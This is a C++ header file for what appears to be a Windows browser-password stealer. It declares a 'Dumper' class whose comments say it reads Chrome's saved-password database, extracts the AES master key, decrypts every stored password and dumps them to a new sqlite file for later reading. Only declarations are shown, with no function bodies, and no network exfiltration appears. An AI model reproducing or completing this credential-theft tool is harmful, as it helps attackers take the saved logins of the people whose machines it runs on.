// cookieVS.h : Include file for standard system include files,
// or project specific include files.

#pragma once

#include <iostream>
#include <windows.h>
#include <string>
#include <wincrypt.h>
#include <winsqlite/winsqlite3.h>
#include <nlohmann/json.hpp>
#include <fstream>
#include "base64.h"
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/gcm.h>
#include<cryptopp/filters.h>
#pragma comment(lib, "Crypt32")
// TODO: Reference additional headers your program requires here.
using namespace std;


//Open the file where Chrom saves the passwords
//Decrypt the password, them write them to a db file for easy reading later
class Dumper
{
private:
	static const string chromePath;
	static string masterKey;

	static string decryptPassword(BYTE* txt);

	//callback function for sql_exec
	//save the password to a new database file
	static int handlePasswords(void* notUsed, int argc, char** argv, char** azColName);

	//read the passwords from Chrome database file
	static string readPasswords();

	//get the master key for the AES decryption of the passwords
	static void getMasterKey();

public:
	//decrypt and dump all the passwords to a new sqlite database file
	static string dumpPassword();

};

